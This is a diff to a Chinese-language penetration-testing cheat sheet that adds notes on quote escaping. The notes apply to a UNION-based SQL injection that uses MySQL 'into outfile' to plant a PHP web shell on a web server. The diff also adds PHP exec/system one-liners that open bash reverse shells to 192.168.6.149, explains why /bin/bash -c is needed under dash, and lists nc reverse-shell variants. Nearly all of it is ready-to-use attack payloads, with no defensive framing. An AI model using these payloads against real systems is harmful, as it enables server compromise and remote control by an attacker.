@@ -113,6 +113,21 @@ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://
 
 netcat使用TCP和UDP建立连接，默认使用TCP
 
+
+
+### 一定要注意转义和引号闭合问题，比如在mysql中写入php的脚本，要么就mysql用双引号，php用单引号，要么就转义
+
+```bash
+#错误写法，这里exec中的第一个单引号就把<?php前的单引号给闭合了。
+#而且exec的第一个单引号会把-c后边（bash前边）的单引号闭合。
+select * from users where id=1 union select 1,'<?php exec('/bin/bash -c 'bash -i >& /dev/tcp/192.168.6.149/6666 0>&1'') ?>',3 into outfile '/var/www/html/1.php';
+
+#正确写法
+select * from users where id=1 union select 1,'<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/192.168.6.149/6666 0>&1\'") ?>',3 into outfile '/var/www/html/1.php';
+```
+
+
+
 ```bash
 #探测某ip端口是否开放和是否运行服务
 ┌──(dxt㉿kali)-[~]
@@ -123,11 +138,20 @@ nc -lvp (127.0.0.1) 5555
 
 #建立反向连接
 bash -i >& /dev/tcp/192.168.6.149/5555 0>&1
+#PHP的（eval不能用）
+<?php exec('/bin/bash -c "bash -i >& /dev/tcp/192.168.6.149/6666 0>&1"') ?>
+<?php system('/bin/bash -c "bash -i >& /dev/tcp/192.168.6.149/6666 0>&1"') ?>
+#之所有不能直接使用bash -i，而还要使用/bin/bash -c声明解释器是因为php的system默认使用的/bin/sh是dash而不是bash，就算后边有bash -i，也是将整个命令先传递给默认shell(dash)解析后显示调用bash，但是dash是解析不了>&这些符号的，所以调用了bash也没用，无法建立反弹shell。
+#而直接在命令行输入可以建立是因为对命令行来说这是一个显示的调用bash处理的命令，而并不会先由默认的shell(dash)解析，所以可以建立反弹shell。
 
 #或者使用nc
 nc 192.168.6.149 5555 -e /bin/bash
+nc 192.168.6.149 5555
+#有的时候版本不同，不支持-e选项，可以尝试去掉-e
 #然后用srcipt启动一个新的bash shell
 script /dev/null -c bash
+
+
 
 #或者php
 php -r '$sock=fsockopen("192.168.6.149",5555);exec("/bin/sh -i <&3 >&3 2>&3");'
